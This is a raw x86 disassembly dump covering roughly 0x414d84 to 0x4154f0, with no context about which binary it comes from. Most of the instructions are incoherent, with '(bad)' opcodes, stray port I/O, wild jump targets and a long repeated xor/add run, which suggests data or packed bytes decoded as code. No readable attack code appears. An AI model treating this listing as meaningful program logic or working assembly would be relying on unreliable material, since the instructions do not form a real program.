  414d84:	dec    esp
  414d85:	and    cl,BYTE PTR [ecx]
  414d87:	das    
  414d88:	sbb    ah,bl
  414d8a:	fld    TBYTE PTR [esi]
  414d8c:	sbb    ah,al
  414d8e:	(bad)  
  414d90:	dec    ecx
  414d91:	push   cs
  414d92:	sub    BYTE PTR [edi+0x0],bl
  414d95:	imul   esp,edx,0x6b
  414d98:	popa   
  414d99:	enter  0x6ae0,0x72
  414d9d:	cld    
  414d9e:	jecxz  0x414e0d
  414da0:	xor    ch,BYTE PTR [ebx+0x476c6506]
  414da6:	(bad)  [eax+0x67]
  414da9:	daa    
  414daa:	jmp    0xe278b3ae
  414daf:	jae    0x414e13
  414db1:	add    BYTE PTR [ecx],bh
  414db3:	loope  0x414e20
  414db5:	xor    DWORD PTR [eax+0x21766ae2],ecx
  414dbb:	jecxz  0x414e1f
  414dbd:	add    BYTE PTR [esi],dh
  414dbf:	in     al,0x73
  414dc1:	push   0x64ffe339
  414dc6:	test   ecx,esp
  414dc8:	pop    esp
  414dc9:	outs   dx,BYTE PTR ds:[esi]
  414dca:	jge    0x414db5
  414dcc:	imul   eax,DWORD PTR [eax],0x6b
  414dcf:	out    0x6a,eax
  414dd1:	outs   dx,DWORD PTR ds:[esi]
  414dd2:	jp     0x414dc1
  414dd4:	jmp    DWORD PTR [ebp+0x7d]
  414dd7:	out    0x66,eax
  414dd9:	outs   dx,DWORD PTR ds:[esi]
  414dda:	outs   dx,BYTE PTR ds:[esi]
  414ddb:	or     al,0x0
  414ddd:	jae    0x414dd8
  414ddf:	loopne 0x414e49
  414de1:	jns    0x414dfb
  414de3:	loope  0x414e41
  414de5:	js     0x414da6
  414de7:	call   0xe049ba57
  414dec:	pop    esp
  414ded:	jae    0x414da6
  414def:	jecxz  0x414df0
  414df1:	imul   eax,DWORD PTR [edi-0x46ff9222],0xbb7731f4
  414dfb:	call   0xe819c033
  414e00:	pop    esp
  414e01:	bound  esp,QWORD PTR [ecx+0x6]
  414e04:	jb     0x414e6b
  414e06:	ins    BYTE PTR es:[edi],dx
  414e07:	mov    ah,0x2f
  414e09:	xor    ecx,eax
  414e0b:	out    0x6b,eax
  414e0d:	popa   
  414e0e:	xor    DWORD PTR [esi],edi
  414e10:	sub    BYTE PTR [edi+0x31],bl
  414e13:	push   eax
  414e14:	xor    ah,BYTE PTR [edi+0x0]
  414e17:	dec    edi
  414e18:	aas    
  414e19:	pop    ds
  414e1a:	add    BYTE PTR [eax-0xd],al
  414e1d:	push   ds
  414e1e:	jb     0x414e45
  414e20:	mov    al,ds:0xec0c6822
  414e25:	xor    BYTE PTR [ebx+0x10],ah
  414e28:	mov    al,ds:0xd55c32f0
  414e2d:	lock call DWORD PTR [ecx]
  414e30:	add    bl,BYTE PTR ds:0x1d11563
  414e36:	push   0x611dae10
  414e3b:	push   es
  414e3c:	scas   al,BYTE PTR es:[edi]
  414e3d:	and    BYTE PTR [eax],al
  414e3f:	aad    0xfc
  414e41:	cmp    esi,DWORD PTR [esp+ecx*8-0x53]
  414e45:	add    DWORD PTR [ecx-0x30],esi
  414e48:	leave  
  414e49:	and    BYTE PTR [ecx+esi*1+0x11],ah
  414e4d:	repz xor DWORD PTR [ebx],eax
  414e50:	psllw  mm7,mm7
  414e53:	into   
  414e54:	shl    BYTE PTR ds:0x279fce6c,0x5f
  414e5b:	ret    0x206f
  414e5e:	jb     0x414e91
  414e60:	(bad)  
  414e61:	and    al,0x6e
  414e63:	cwde   
  414e64:	int    0x25
  414e66:	ins    BYTE PTR es:[edi],dx
  414e67:	xchg   esp,eax
  414e68:	mov    dl,0x2a
  414e6a:	addr16 popf 
  414e6c:	jle    0x414e8e
  414e6e:	outs   dx,BYTE PTR ds:[esi]
  414e6f:	xor    DWORD PTR [ebx-0x767d8edc],edx
  414e75:	and    BYTE PTR [eax],al
  414e77:	and    BYTE PTR [esi],0x20
  414e7a:	ins    BYTE PTR es:[edi],dx
  414e7b:	add    BYTE PTR [ebp+0x63700191],al
  414e81:	xchg   ecx,eax
  414e82:	cmp    al,0x63
  414e84:	arpl   WORD PTR [edx+0x9656d29],si
  414e8a:	dec    ebx
  414e8b:	and    eax,0x2b56094c
  414e90:	pop    edi
  414e91:	sub    eax,0x9402d46
  414e96:	cmp    al,0x2f
  414e98:	inc    eax
  414e99:	sbb    eax,0x9522b4b
  414e9e:	inc    esi
  414e9f:	and    esp,DWORD PTR ds:0x13043a2e
  414ea5:	xor    bh,BYTE PTR [ebx]
  414ea7:	sub    BYTE PTR [edx+ebp*1],dl
  414eaa:	sbb    ebx,DWORD PTR [edi]
  414eac:	and    BYTE PTR [ecx],cl
  414eae:	push   es
  414eaf:	sub    al,0x13
  414eb1:	sub    eax,0x3031261b
  414eb6:	add    eax,0x14340b2c
  414ebb:	add    al,0x46
  414ebd:	fstp   TBYTE PTR [ecx-0x4220dc11]
  414ec3:	sti    
  414ec4:	pop    ds
  414ec5:	(bad)  
  414ec7:	add    edx,edx
  414ec9:	sbb    al,0xe2
  414ecb:	xor    edi,ebx
  414ecd:	xor    ecx,esi
  414ecf:	xor    edi,ebx
  414ed1:	pop    ds
  414ed2:	fadd   QWORD PTR [ebx]
  414ed4:	fstp   DWORD PTR [ebx+edx*8]
  414ed7:	xor    edi,ebx
  414ed9:	not    DWORD PTR ds:0xce206f2
  414edf:	out    dx,eax
  414ee0:	add    BYTE PTR [edi-0x9],ah
  414ee3:	clc    
  414ee4:	repnz pop esi
  414ee6:	idiv   eax
  414ee8:	out    dx,al
  414ee9:	dec    ebp
  414eea:	sbb    DWORD PTR [esi-0x7a0761db],edx
  414ef0:	and    al,BYTE PTR [ebp-0x66cc3ad2]
  414ef6:	sbb    edi,esp
  414ef8:	sub    eax,DWORD PTR [ebp+0x45f9771d]
  414efe:	clc    
  414eff:	mov    ch,0xef
  414f01:	sbb    al,0xe2
  414f03:	push   DWORD PTR [edi-0x4ace0934]
  414f09:	aam    0xd9
  414f0b:	cs and ah,cl
  414f0e:	aaa    
  414f0f:	ins    DWORD PTR es:[edi],dx
  414f10:	dec    edi
  414f11:	or     dh,dh
  414f13:	fs dec eax
  414f15:	add    DWORD PTR [esi+ebp*1],ebp
  414f18:	pop    ecx
  414f19:	or     eax,0xae90019
  414f1e:	sbb    eax,0xf4ab3974
  414f23:	sub    al,0x44
  414f25:	inc    esi
  414f26:	sbb    eax,0x30634863
  414f2b:	popa   
  414f2c:	adc    BYTE PTR [edi-0x68f392d8],cl
  414f32:	sbb    esi,DWORD PTR [edx-0x3a]
  414f35:	daa    
  414f36:	ficom  WORD PTR [eax-0x2f]
  414f39:	dec    ecx
  414f3a:	xor    al,0x6b
  414f3c:	xlat   BYTE PTR ds:[ebx]
  414f3d:	pop    ss
  414f3e:	and    DWORD PTR [ebx-0x17],esp
  414f41:	sbb    bl,BYTE PTR ds:0x6800f974
  414f47:	hlt    
  414f48:	sub    al,0x5
  414f4a:	sbb    ebp,DWORD PTR ds:[ebx-0x2a]
  414f4e:	xor    eax,0x1bc75f1b
  414f53:	sbb    eax,0x36100763
  414f58:	imul   edi,edi,0x10
  414f5b:	sbb    ebp,DWORD PTR ds:0x432fe7aa
  414f61:	hlt    
  414f62:	jl     0x414faf
  414f64:	pop    edx
  414f65:	pop    es
  414f66:	inc    esi
  414f67:	and    DWORD PTR [ebx-0x17],esp
  414f6a:	dec    edx
  414f6b:	sbb    eax,0xf6189974
  414f70:	sub    al,0x96
  414f72:	pop    ebp
  414f73:	sbb    al,0x2e
  414f75:	mov    es,WORD PTR [eax+0x1a]
  414f78:	jo     0x414ff8
  414f7a:	push   edi
  414f7b:	inc    esi
  414f7c:	add    BYTE PTR [bp+di-0x15],bh
  414f80:	jae    0x414feb
  414f82:	data16 jmp 0x414fb2
  414f85:	arpl   WORD PTR [edi+0x5a622def],bp
  414f8b:	lods   eax,DWORD PTR ds:[esi]
  414f8c:	xor    DWORD PTR [eax+0x72],ebx
  414f8f:	lock dec edi
  414f91:	jp     0x414fd1
  414f93:	lock ja 0x414ffb
  414f96:	fmul   DWORD PTR [edx]
  414f98:	push   ebp
  414f99:	push   ebp
  414f9a:	adc    DWORD PTR ds:0xe4064453,edi
  414fa0:	dec    ebx
  414fa1:	inc    ebp
  414fa2:	test   al,0x55
  414fa4:	push   ecx
  414fa5:	dec    ecx
  414fa6:	dec    eax
  414fa7:	out    0x43,al
  414fa9:	inc    esi
  414faa:	add    BYTE PTR [ecx+0x49],dl
  414fad:	inc    ecx
  414fae:	xor    cl,dh
  414fb0:	aas    
  414fb1:	inc    ebp
  414fb2:	inc    ebx
  414fb3:	dec    edx
  414fb4:	push   esp
  414fb5:	push   eax
  414fb6:	push   esp
  414fb7:	push   ebp
  414fb8:	push   ecx
  414fb9:	xor    BYTE PTR [ecx+0x45],bl
  414fbc:	in     al,0x2c
  414fbe:	cs mov eax,0x5800000a
  414fc4:	or     al,BYTE PTR [edx]
  414fc6:	add    BYTE PTR ds:0x4955444a,cl
  414fcc:	or     eax,0xa480000
  414fd1:	add    BYTE PTR [eax],al
  414fd3:	pop    eax
  414fd4:	or     cl,BYTE PTR [edi+0x4f]
  414fd7:	xchg   esi,eax
  414fd8:	ds push ebx
  414fda:	inc    ecx
  414fdb:	jp     0x41502e
  414fdd:	pop    esp
  414fde:	dec    ebp
  414fdf:	popa   
  414fe0:	out    dx,eax
  414fe1:	jno    0x415052
  414fe3:	jmp    0x414fcf
  414fe5:	gs je  0x414fa4
  414fe8:	inc    edx
  414fe9:	outs   dx,BYTE PTR gs:[esi]
  414feb:	hlt    
  414fec:	jmp    0x7271:0x4eec7372
  414ff3:	stos   BYTE PTR es:[edi],al
  414ff4:	lock ins DWORD PTR es:[edi],dx
  414ff6:	je     0x415029
  414ff8:	data16 sub BYTE PTR [edx-0x7e],dh
  414ffc:	mov    DWORD PTR [edx],esp
  414ffe:	outs   dx,BYTE PTR ds:[esi]
  414fff:	push   ebp
  415000:	test   DWORD PTR [edi],ebx
  415002:	addr16 pop edi
  415004:	and    esi,DWORD PTR ds:0x18c555f
  41500a:	push   ebx
  41500b:	dec    edi
  41500c:	mov    DWORD PTR [edi],ebx
  41500e:	jno    0x415010
  415010:	pop    ebp
  415011:	push   ecx
  415012:	and    BYTE PTR [edx+eiz*2+0x3c],ch
  415016:	ss addr16 push edi
  415019:	push   edi
  41501a:	add    al,0x44
  41501c:	dec    eax
  41501d:	inc    ebx
  41501e:	xor    al,0x6c
  415020:	push   eax
  415021:	dec    ecx
  415022:	inc    edx
  415023:	pop    edi
  415024:	sbb    al,0x4d
  415026:	add    al,0x5c
  415028:	xor    DWORD PTR [eax-0x4fceffff],esi
  41502e:	add    DWORD PTR [eax],eax
  415030:	xor    DWORD PTR [esi-0x4feb87d8],edi
  415036:	push   esi
  415037:	ins    DWORD PTR es:[edi],dx
  415038:	(bad)  
  41503a:	cmp    DWORD PTR [edi+0x3],ebx
  41503d:	or     eax,0xfe085550
  415042:	push   ebp
  415043:	aas    
  415044:	add    esi,DWORD PTR [eax+0xdcc7022]
  41504a:	add    al,0xff
  41504c:	pop    esi
  41504d:	scas   eax,DWORD PTR es:[edi]
  41504e:	sub    DWORD PTR [ecx-0x34],0xdd631fc1
  415055:	add    dh,dh
  415057:	sub    eax,0x1dcbcd
  41505c:	out    0x5b,al
  41505e:	push   esi
  41505f:	inc    ebp
  415060:	int3   
  415061:	arpl   WORD PTR [ecx+eiz*2-0x5b],ax
  415065:	mov    ecx,0xcb726337
  41506a:	pop    ds
  41506b:	jno    0x414ffb
  41506d:	data16 sub BYTE PTR [ecx-0x74],dl
  415071:	or     DWORD PTR [edx+0x34960036],ebx
  415077:	lea    edi,[ecx*4-0x73ca48f7]
  41507e:	sub    BYTE PTR [esi+esi*1+0x578b5280],al
  415085:	pop    esp
  415086:	cmp    BYTE PTR [esi+esi*1+0x21863260],al
  41508d:	jbe    0x4150bc
  41508f:	out    0x3,eax
  415091:	inc    edi
  415092:	cs pop ebx
  415094:	and    eax,DWORD PTR [ecx+0x32]
  415097:	sbb    dh,dh
  415099:	adc    al,0x2d
  41509b:	inc    ebx
  41509c:	and    BYTE PTR [ecx],dh
  41509e:	push   ebx
  41509f:	inc    esp
  4150a0:	cmp    dh,dh
  4150a2:	sbb    BYTE PTR [eax+0x46],dl
  4150a5:	and    ch,BYTE PTR [ebx]
  4150a7:	inc    ebp
  4150a8:	daa    
  4150a9:	and    ecx,DWORD PTR [ebx+0x39]
  4150ac:	daa    
  4150ad:	adc    cl,BYTE PTR [ecx]
  4150af:	sbb    eax,0x1a3e1d27
  4150b4:	daa    
  4150b5:	add    ecx,DWORD PTR [esi+0xd]
  4150b8:	aaa    
  4150b9:	sbb    cl,BYTE PTR [ecx]
  4150bb:	out    0x20,eax
  4150bd:	or     eax,0x44f5da2e
  4150c2:	sub    eax,0x38312013
  4150c7:	repz sub ah,dh
  4150ca:	sbb    BYTE PTR [edx+eiz*1],cl
  4150cd:	add    BYTE PTR ds:0x2bf635fe,bl
  4150d3:	int3   
  4150d4:	add    esi,DWORD PTR [ecx]
  4150d6:	sub    al,bl
  4150d8:	cmp    DWORD PTR [eax],eax
  4150da:	out    0x18,al
  4150dc:	shl    ah,0x0
  4150df:	repz ret 0xc51f
  4150e3:	or     BYTE PTR [eax-0x35cb62e1],ch
  4150e9:	and    bl,BYTE PTR [ebp+0x50a8002e]
  4150ef:	sub    eax,0x1d3bbf47
  4150f4:	mov    BYTE PTR ds:0x7a2c,ch
  4150f9:	test   BYTE PTR [ebp+0x2c],bl
  4150fc:	fs jmp 0x8aa48277
  415102:	adc    eax,0x17926d3d
  415107:	xor    ecx,DWORD PTR [ebx-0x7c]
  41510a:	inc    edi
  41510b:	daa    
  41510c:	arpl   WORD PTR [ebx+0x25],di
  41510f:	xor    DWORD PTR [edi+0x79],esp
  415112:	xor    cl,BYTE PTR [ebx+0x72]
  415115:	dec    esp
  415116:	push   ss
  415117:	cmp    ah,BYTE PTR [edi+0x45]
  41511a:	sub    eax,0x94c724a
  41511f:	dec    eax
  415120:	outs   dx,BYTE PTR ds:[esi]
  415121:	push   esp
  415122:	push   ss
  415123:	sub    BYTE PTR [edx+0x48],dh
  415126:	imul   ebp,DWORD PTR [eax],0x16ede93f
  41512c:	arpl   WORD PTR [ebp-0x15],cx
  41512f:	push   ss
  415130:	arpl   WORD PTR [ebp+ebp*1+0x4a],ax
  415134:	jb     0x415156
  415136:	inc    ebp
  415137:	sbb    eax,0x38490445
  41513c:	jno    0x41514a
  41513e:	add    BYTE PTR [edi+0x52],al
  415141:	arpl   WORD PTR [eax],dx
  415143:	sub    eax,0x2500724a
  415148:	sbb    eax,0x361d0143
  41514d:	jb     0x41514c
  41514f:	sbb    eax,0xede97728
  415154:	push   ss
  415155:	ja     0x415130
  415157:	push   es
  415158:	dec    ebp
  415159:	arpl   dx,bx
  41515b:	(bad)  
  41515c:	push   ss
  41515d:	ins    DWORD PTR es:[edi],dx
  41515e:	sar    ch,1
  415160:	daa    
  415161:	ja     0x41514c
  415163:	in     eax,dx
  415164:	push   ss
  415165:	ja     0x415167
  415167:	call   0xf4a6a346
  41516c:	jmp    0x4151ca
  41516e:	jae    0x41515d
  415170:	dec    ebp
  415171:	imul   ebp,DWORD PTR [esi-0x24],0xffffffeb
  415175:	ja     0x4151eb
  415177:	sbb    BYTE PTR ds:0xdcad7661,bh
  41517d:	jae    0x4151d3
  41517f:	mov    bh,0x3d
  415181:	popa   
  415182:	ins    BYTE PTR es:[edi],dx
  415183:	scas   al,BYTE PTR es:[edi]
  415184:	push   es
  415185:	dec    ebx
  415186:	jo     0x415145
  415188:	call   0xedf8c3dc
  41518d:	pusha  
  41518e:	jae    0x4151eb
  415190:	cmp    ch,BYTE PTR [ebx+0x6b]
  415193:	lods   eax,DWORD PTR ds:[esi]
  415194:	call   0xdda69a98
  415199:	pusha  
  41519a:	jb     0x415207
  41519c:	add    ch,BYTE PTR [esi+0x61]
  41519f:	pop    esp
  4151a0:	lock dec ebx
  4151a2:	outs   dx,DWORD PTR ds:[esi]
  4151a3:	add    BYTE PTR [edi-0x16],ch
  4151a6:	pusha  
  4151a7:	add    edx,DWORD PTR fs:[bx+di+0x73]
  4151ac:	in     eax,dx
  4151ad:	(bad)  
  4151ae:	inc    DWORD PTR [esi-0x13]
  4151b1:	loopne 0x415206
  4151b3:	outs   dx,DWORD PTR ds:[esi]
  4151b4:	repz out dx,eax
  4151b6:	ins    DWORD PTR es:[edi],dx
  4151b7:	dec    ecx
  4151b8:	es jmp 0x415225
  4151bb:	jb     0x4151f2
  4151bd:	in     al,dx
  4151be:	jae    0x415229
  4151c0:	aaa    
  4151c1:	add    eax,DWORD PTR [eax]
  4151c3:	inc    ebx
  4151c4:	ja     0x4151ca
  4151c6:	jbe    0x41522d
  4151c8:	push   0xffffffda
  4151ca:	dec    esi
  4151cb:	imul   ebp,DWORD PTR [ecx+eax*2],0xd85c536b
  4151d2:	outs   dx,BYTE PTR fs:[esi]
  4151d4:	das    
  4151d5:	ss gs fs cdq 
  4151d9:	push   es
  4151da:	dec    esp
  4151db:	outs   dx,DWORD PTR ds:[esi]
  4151dc:	outs   dx,DWORD PTR ds:[esi]
  4151dd:	add    ebp,DWORD PTR [esi+0x55]
  4151e0:	xor    DWORD PTR [edi-0x500f8dd8],edi
  4151e6:	cmp    eax,0x38b79e6d
  4151eb:	jo     0x41516e
  4151ed:	pop    esi
  4151ee:	sbb    al,0x76
  4151f0:	mov    ah,cl
  4151f2:	sub    BYTE PTR [ebp-0x74],ah
  4151f5:	jp     0x41521b
  4151f7:	ins    BYTE PTR es:[edi],dx
  4151f8:	test   BYTE PTR [ebp-0x738fffbc],dl
  4151fe:	pop    ss
  4151ff:	jae    0x415183
  415201:	test   BYTE PTR [ebp+0x6d],dl
  415204:	mov    cl,BYTE PTR [ebp+0x6300501b]
  41520a:	jns    0x41523f
  41520c:	addr16 push ebp
  41520e:	lea    esp,[esi]
  415210:	arpl   WORD PTR [edx-0x50],sp
  415213:	add    DWORD PTR [ecx+0x63],esp
  415216:	sbb    DWORD PTR [ecx],esi
  415218:	je     0x41521c
  41521a:	(bad)  
  41521b:	frstor [ebx+0x55]
  41521e:	push   esp
  41521f:	add    al,0x41
  415221:	inc    ebx
  415222:	cmp    DWORD PTR [esp+esi*2],esi
  415225:	pop    esp
  415226:	loop   0x41525b
  415228:	jb     0x415248
  41522a:	in     al,0x26
  41522c:	popa   
  41522d:	sbb    eax,0x107422ec
  415232:	mov    al,0x42
  415234:	arpl   WORD PTR [ebx],sp
  415236:	fdivr  QWORD PTR [eax+esi*2]
  415239:	adc    al,0xfa
  41523b:	push   eax
  41523c:	ja     0x415240
  41523e:	cld    
  41523f:	es imul esp,edx,0x3
  415243:	sbb    eax,0x3f10c72
  415248:	inc    ecx
  415249:	aam    0x9d
  41524b:	xor    eax,0x209cd743
  415250:	inc    ecx
  415251:	aam    0x9d
  415253:	xor    eax,0x2108cf67
  415258:	pop    edi
  415259:	lds    ecx,FWORD PTR [eax]
  41525b:	int3   
  41525c:	xor    ch,dh
  41525e:	xor    bh,BYTE PTR [edx-0x33e933c9]
  415264:	add    esi,eax
  415266:	sub    ebx,ecx
  415268:	aaa    
  415269:	jo     0x415298
  41526b:	(bad)  
  41526c:	xor    al,BYTE PTR [eax]
  41526e:	xchg   edx,eax
  41526f:	cmp    al,0xb3
  415271:	push   ds
  415272:	mov    ds:0xa342e726,eax
  415277:	and    dh,BYTE PTR [edi-0x67d3b1c9]
  41527d:	cmp    BYTE PTR [esi-0x6dbd7be5],cl
  415283:	sbb    ebx,DWORD PTR [ebx-0x75cd70e4]
  415289:	and    al,0x65
  41528b:	es xchg edi,eax
  41528d:	xor    DWORD PTR [esi+0x17],ecx
  415290:	mov    BYTE PTR [edi],dh
  415292:	push   edx
  415293:	push   esp
  415294:	mov    WORD PTR [ecx+esi*1],gs
  415297:	or     DWORD PTR [edx+esi*1+0x56],edi
  41529b:	out    dx,eax
  41529c:	dec    edx
  41529d:	and    BYTE PTR [ebp+0x9],dl
  4152a0:	sub    al,0x31
  4152a2:	push   esi
  4152a3:	dec    eax
  4152a4:	dec    esp
  4152a5:	cmp    BYTE PTR [eax+0x30],dh
  4152a8:	cmp    al,0x34
  4152aa:	sbb    al,0x2f
  4152ac:	dec    esp
  4152ad:	push   ds
  4152ae:	sbb    eax,0x9384839
  4152b3:	dec    edx
  4152b4:	out    0x3,eax
  4152b6:	and    DWORD PTR [ebx+esi*1],ebx
  4152b9:	sbb    eax,0xde0a2603
  4152be:	adc    ch,BYTE PTR ds:0x3be1040b
  4152c4:	sbb    ebx,DWORD PTR ds:0x322a2603
  4152ca:	shr    BYTE PTR [ecx],cl
  4152cc:	sti    
  4152cd:	es out dx,al
  4152cf:	cs cli 
  4152d1:	aaa    
  4152d2:	add    dh,bh
  4152d4:	add    BYTE PTR cs:[edx],cl
  4152d7:	push   cs
  4152d8:	or     DWORD PTR [eax],eax
  4152da:	jmp    0xe9415c11
  4152df:	xor    cl,BYTE PTR [ecx]
  4152e1:	add    cl,ch
  4152e3:	xor    cl,BYTE PTR [ecx]
  4152e5:	add    cl,ch
  4152e7:	xor    cl,BYTE PTR [ecx]
  4152e9:	add    cl,ch
  4152eb:	xor    cl,BYTE PTR [ecx]
  4152ed:	add    cl,ch
  4152ef:	xor    cl,BYTE PTR [ecx]
  4152f1:	add    cl,ch
  4152f3:	xor    cl,BYTE PTR [ecx]
  4152f5:	add    cl,ch
  4152f7:	xor    cl,BYTE PTR [ecx]
  4152f9:	add    cl,ch
  4152fb:	xor    cl,BYTE PTR [ecx]
  4152fd:	add    cl,ch
  4152ff:	xor    cl,BYTE PTR [ecx]
  415301:	add    cl,ch
  415303:	xor    cl,BYTE PTR [ecx]
  415305:	add    cl,ch
  415307:	xor    cl,BYTE PTR [ecx]
  415309:	add    cl,ch
  41530b:	xor    cl,BYTE PTR [ecx]
  41530d:	add    cl,ch
  41530f:	xor    cl,BYTE PTR [ecx]
  415311:	add    cl,ch
  415313:	xor    cl,BYTE PTR [ecx]
  415315:	add    cl,ch
  415317:	xor    cl,BYTE PTR [ecx]
  415319:	add    cl,ch
  41531b:	xor    cl,BYTE PTR [ecx]
  41531d:	add    cl,ch
  41531f:	xor    cl,BYTE PTR [ecx]
  415321:	add    cl,ch
  415323:	xor    cl,BYTE PTR [ecx]
  415325:	add    cl,ch
  415327:	xor    cl,BYTE PTR [ecx]
  415329:	add    cl,ch
  41532b:	xor    cl,BYTE PTR [ecx]
  41532d:	add    cl,ch
  41532f:	xor    cl,BYTE PTR [ecx]
  415331:	add    cl,ch
  415333:	xor    cl,BYTE PTR [ecx]
  415335:	add    cl,ch
  415337:	add    BYTE PTR [edx],dh
  415339:	or     DWORD PTR [eax],eax
  41533b:	jmp    0xe9415c72
  415340:	xor    cl,BYTE PTR [ecx]
  415342:	add    cl,ch
  415344:	xor    cl,BYTE PTR [ecx]
  415346:	add    cl,ch
  415348:	xor    cl,BYTE PTR [ecx]
  41534a:	add    cl,ch
  41534c:	xor    cl,BYTE PTR [ecx]
  41534e:	add    BYTE PTR [eax],al
  415350:	imul   eax,DWORD PTR [ebx],0x61
  415353:	ins    BYTE PTR es:[edi],dx
  415354:	sub    al,0x9a
  415356:	das    
  415357:	cs and al,0xe9
  41535a:	imul   eax,DWORD PTR [eax],0x2b
  41535d:	fld    QWORD PTR [edx+0x65]
  415360:	fs inc ebp
  415362:	imul   ebp,DWORD PTR [esp+esi*2-0x1a],0x71
  415367:	push   eax
  415368:	imul   edx,edi,0xb184167
  41536e:	add    BYTE PTR [eax],al
  415370:	sbb    BYTE PTR [ebx],cl
  415372:	and    cl,BYTE PTR [ecx+ecx*8+0xa]
  415376:	xor    ecx,DWORD PTR [ecx+ecx*8+0xa]
  41537a:	inc    ebx
  41537b:	dec    esp
  41537c:	(bad)  [edx]
  41537e:	pop    ecx
  41537f:	dec    esp
  415380:	(bad)  [edx]
  415382:	addr16 dec esp
  415384:	leave  
  415385:	or     dh,BYTE PTR [edi+0x4c]
  415388:	leave  
  415389:	or     al,BYTE PTR [edi-0x5ff566b4]
  41538f:	dec    esp
  415390:	cdq    
  415391:	or     dh,BYTE PTR [ebx-0x38f576b4]
  415397:	dec    esp
  415398:	mov    DWORD PTR [edx],ecx
  41539a:	in     al,0x4c
  41539c:	add    BYTE PTR [ecx+0x194d080a],bl
  4153a2:	add    eax,0x5094d21
  4153a7:	add    BYTE PTR [eax],al
  4153a9:	enter  0xfd0a,0xff
  4153ad:	cwde   
  4153ae:	mov    al,BYTE PTR [ecx]
  4153b0:	add    BYTE PTR [eax+0x2879490a],bl
  4153b6:	dec    ecx
  4153b7:	imul   esp,DWORD PTR [ebx+0x55],0x0
  4153bb:	popa   
  4153bc:	outs   dx,BYTE PTR ds:[esi]
  4153bd:	inc    esp
  4153be:	(bad)  
  4153bf:	inc    DWORD PTR [eax]
  4153c1:	cwde   
  4153c2:	or     al,BYTE PTR [eax+0xa881a]
  4153c8:	inc    ecx
  4153c9:	xor    DWORD PTR [eax],eax
  4153cb:	xor    al,0x44
  4153cd:	shl    bl,1
  4153cf:	and    al,BYTE PTR [eax]
  4153d1:	xor    BYTE PTR [eax-0x4fc27fff],dh
  4153d7:	add    DWORD PTR [eax],eax
  4153d9:	in     eax,0x6
  4153db:	and    eax,0x44cfdd5f
  4153e0:	jo     0x4153a3
  4153e2:	imul   esp,DWORD PTR [esp+esi*2],0xffffffd0
  4153e6:	scas   eax,DWORD PTR es:[edi]
  4153e7:	add    al,0x0
  4153e9:	xor    DWORD PTR [eax],esi
  4153eb:	in     al,0xff
  4153ed:	cs mov al,0x46
  4153f0:	pop    edi
  4153f1:	xchg   edx,eax
  4153f2:	mov    eax,0xb0300020
  4153f7:	add    DWORD PTR [eax+0x1b050],eax
  4153fd:	jb     0x41545e
  4153ff:	sbb    ch,BYTE PTR [ecx+0x0]
  415402:	cwde   
  415403:	lea    esi,[esi]
  415405:	add    BYTE PTR [eax],dh
  415407:	mov    al,0x1
  415409:	adc    BYTE PTR [ebx-0x50],0x1
  41540d:	add    BYTE PTR [ecx-0x77],bh
  415410:	ss je  0x415469
  415413:	and    ch,BYTE PTR [eax+eax*1]
  415416:	xor    esi,DWORD PTR [eax-0x4fd37fff]
  41541c:	add    DWORD PTR [eax],eax
  41541e:	jl     0x415439
  415420:	loope  0x415465
  415422:	push   esi
  415423:	push   ebx
  415424:	das    
  415425:	imul   edx,DWORD PTR [esi+ecx*2+0x30],0x71
  41542a:	xor    DWORD PTR [edx+0x12b10001],esi
  415430:	add    al,0x0
  415432:	xor    ebx,esi
  415434:	sbb    BYTE PTR [ebx+0xc],ch
  415437:	dec    edi
  415438:	sbb    ah,BYTE PTR [eax]
  41543a:	lock fbstp TBYTE PTR [ebx]
  41543d:	inc    esp
  41543e:	adc    ah,dl
  415440:	and    al,BYTE PTR [eax]
  415442:	xor    BYTE PTR [ecx],cl
  415444:	out    0x3,eax
  415446:	mov    cl,0xe5
  415448:	out    0x3,al
  41544a:	xor    DWORD PTR [eax+edx*1-0x1c],ecx
  41544e:	(bad)  
  41544f:	das    
  415450:	or     dh,BYTE PTR [eax]
  415452:	loop   0x41546e
  415454:	or     al,0x37
  415456:	xor    DWORD PTR [ebx],ecx
  415458:	out    0x3,eax
  41545a:	mov    cl,0xee
  41545c:	out    0x3,al
  41545e:	xor    DWORD PTR [edx-0x2],ecx
  415461:	sbb    dl,bl
  415463:	sub    eax,0xf200e3d5
  415468:	sub    eax,0x23ca30ca
  41546d:	lds    ebp,FWORD PTR [edi]
  41546f:	mov    al,ds:0x3103e909
  415474:	mov    DWORD PTR [esi],edx
  415476:	add    al,0x31
  415478:	or     DWORD PTR [edx-0x39d175e6],ebp
  41547e:	sbb    DWORD PTR [ecx+0x4a],edx
  415481:	ret    
  415482:	sbb    BYTE PTR [esi-0x7ac96fd5],cl
  415488:	pop    ss
  415489:	mov    BYTE PTR [edi],ch
  41548b:	mov    ss,WORD PTR [ebx]
  41548d:	mov    ebx,fs
  41548f:	sub    BYTE PTR [esi+edi*2],0x17
  415493:	pusha  
  415494:	or     eax,ebp
  415496:	add    esi,DWORD PTR [ecx]
  415498:	mov    DWORD PTR [edi-0x57f6cefd],esi
  41549e:	pop    ds
  41549f:	pop    edx
  4154a0:	xor    bh,BYTE PTR [ebp+0x1c]
  4154a3:	inc    eax
  4154a4:	adc    eax,0x32452359
  4154a9:	push   ebp
  4154aa:	pop    ds
  4154ab:	adc    DWORD PTR ds:0x181d1946,esi
  4154b1:	out    0x2,eax
  4154b3:	xor    DWORD PTR [ecx],ecx
  4154b5:	call   FWORD PTR [bp-0x1864]
  4154ba:	push   ebx
  4154bb:	adc    dl,BYTE PTR [edi]
  4154bd:	add    BYTE PTR [edx],bh
  4154bf:	sub    BYTE PTR [ebx],ch
  4154c1:	pop    edi
  4154c2:	cmp    eax,0xf6d3a2d
  4154c7:	inc    ecx
  4154c8:	push   ss
  4154c9:	pop    edi
  4154ca:	sbb    eax,DWORD PTR [eax]
  4154cc:	push   ss
  4154cd:	cmp    eax,0x1714004b
  4154d2:	ins    DWORD PTR es:[edi],dx
  4154d3:	sbb    cl,BYTE PTR [eax+0x23]
  4154d6:	je     0x4154fd
  4154d8:	add    BYTE PTR [esi+ebp*2],ah
  4154db:	add    eax,0x15711638
  4154e0:	hlt    
  4154e1:	pop    ss
  4154e2:	jb     0x4154df
  4154e4:	daa    
  4154e5:	sub    esi,DWORD PTR [edi+edi*4+0x1f]
  4154e9:	pop    ss
  4154ea:	jno    0x4154bc
  4154ec:	sbb    DWORD PTR [ebx],ebp
  4154ee:	pop    esp
  4154ef:	lods   al,BYTE PTR ds:[esi]
  4154f0:	pop    edx
